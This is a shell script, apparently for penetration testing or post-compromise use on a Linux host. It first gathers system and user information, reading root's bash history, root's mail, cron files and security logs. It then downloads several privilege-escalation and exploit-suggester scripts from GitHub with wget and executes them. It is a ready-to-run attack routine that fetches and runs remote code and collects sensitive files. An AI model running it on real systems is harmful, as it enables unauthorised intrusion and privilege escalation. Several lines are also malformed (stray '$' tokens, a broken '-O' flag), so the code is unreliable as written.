#!/usr/bin/sh

#Survey, enumeration, and privesc checking script for Linux/Unix machines. Runs survey commands, then downloads and runs a few privesc/exploit checkers.

#SURVEY COMMANDS
#Check other logged-on accounts
w; who;
#Check account name
whoami;
#Check hostname
hostnamectl;
#Check OS and version info
uname -a;
#Look around important directories
ls -latr / /tmp /etc . .. /root /home /var/log*
#Check running processes
ps -elf; 
#Check processor usage
top -b -n1;
#Check network config info
ifconfig;
#Check network connections 
netstat -auntp;
#Check recent Cron messages
tail -n1000 /var/spool/cron/*;
#Check root's bash history 
cat /root/.bash_history;
#Check our user's bash history 
cat ~/.bash_history;
#Check root's mail
cat /var/mail/root;
#List disk partitions
fdisk -l; 
#Get system datetime
date;date -u; 
#Check filesystem disk usage 
df; 
#Look at some interesting logs
tail -n50 /var/log/cron /var/log/secure /var/log/messages; 
#Check out cronjobs 
cat /etc/crontab 
#Check files modified since we got on 
find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -15 -type f -print |  xargs ls -latr



#ENUMERATION SCRIPTS

#LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
chmod +x linenum.sh
./linenum.sh -t > linenum.txt $ 

#LinPrivCheck
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py -O linpriv.py
chmod +x linpriv.py
./linpriv.py > linpriv.txt $ 

#UnixPrivCheck
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh -O upc.sh
chmod +x upc.sh
./upc.sh > upc.txt $


#PRIVESC AND EXPLOIT SCRIPTS

#Download and run LES - checks for kernel exploits and LPE's 
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
./les.sh > les.txt $

#LinExpSugg
wget https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl - O expsug.pl
chmod +x expsug.pl
./expsug.pl > expsug.txt $


